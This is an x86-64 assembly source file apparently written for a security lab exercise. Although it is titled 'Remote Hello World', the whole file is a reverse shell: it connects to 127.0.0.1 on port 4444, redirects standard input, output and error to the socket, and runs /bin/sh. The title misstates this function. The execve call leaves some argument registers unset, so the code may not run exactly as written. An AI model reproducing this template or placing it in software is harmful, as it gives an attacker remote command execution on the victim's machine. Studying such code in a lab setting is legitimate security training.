;Lab3_3 Remote Hello World
SECTION .data
	msg: db "/bin/sh", 0
	errExit: db "There was an error.  Please check the debugger.", 10, 0
	cleanExit: db "The program exited without error.", 10, 0

SECTION .text
global _start

_start:
	mov rax, 41			;socket call code
	mov rdi, 2			;inet
	mov rsi, 1			;sock_stream
	mov rdx, 0			;protocol
	syscall				;sys_socket
	cmp rax, 0			;check for error return
	jl .error
	mov r12, rax			;fd
	mov rax, 42			;connect call code
	mov rdx, 16			;addrlen
	mov dword [rsp-4], 0x0100007f	;inet addr 127.0.0.1
	mov word [rsp-6], 0x5c11	;port 4444
	mov byte [rsp-8], 2		;inet
	sub rsp, 8			;stack alignment
 	mov rsi, rsp			;sock_addr
	mov rdi, r12			;move fd into rdi for parameter
	syscall 			;sys_connect
	cmp rax, 0			;check for error return
	jl .error
	mov rax, 33			;indicates dup2
	mov rsi, 0			;move old file descriptor to new param
	mov rdi, r12			;indicate file descriptor
	syscall				;dup2 for stdin
	cmp rax, 0			;check for error return
	jl .error
	mov rax, 33			;indicates dup2
	mov rsi, 1			;move stdout
	mov rdi, r12			;indicate file descriptor
	syscall				;dup2 for stdout
	cmp rax, 0			;check for error return
	jl .error
	mov rax, 33			;indicates dup2
	mov rsi, 2			;mov stderr
	mov rdi, r12			;indicate file descriptor
	syscall				;dup2 for stderr
	cmp rax, 0			;check for error return
	jl .error
	mov rax, 59			;execve call code
	mov rdi, msg			;send /bin/sh
	;mov rdx, 7			;length of msg
	;mov r10, 0			;flags
	;mov r8, [rsp]			;sock_addr
	;mov r9, 0x10			;addrlen
	syscall 			;sys_execve
	cmp rax, 0			;check for error return
	jl .error			;go to the error print
	mov rax, 1			;write call code
	mov rdi, 1			;stdout
	mov rsi, cleanExit		;send the clean exit message
	mov rdx, 35			;the length of the message
	syscall				;call the write
	mov rdi, 0			;no error code
	jmp .exit			;exit cleanly at end of program
.exit:
	mov rax, 60			;exit call code
	syscall ;sys_exit
.error:
	mov r13, rax			;error code for storage
	mov rax, 1			;write call code
	mov rdi, 1			;stdout
	mov rsi, errExit		;send the error message to call
	mov rdx, 49			;length of the error message
	syscall				;call the write
	mov rdi, r13			;mov the error code to the exit call
	jmp .exit			;leave the program
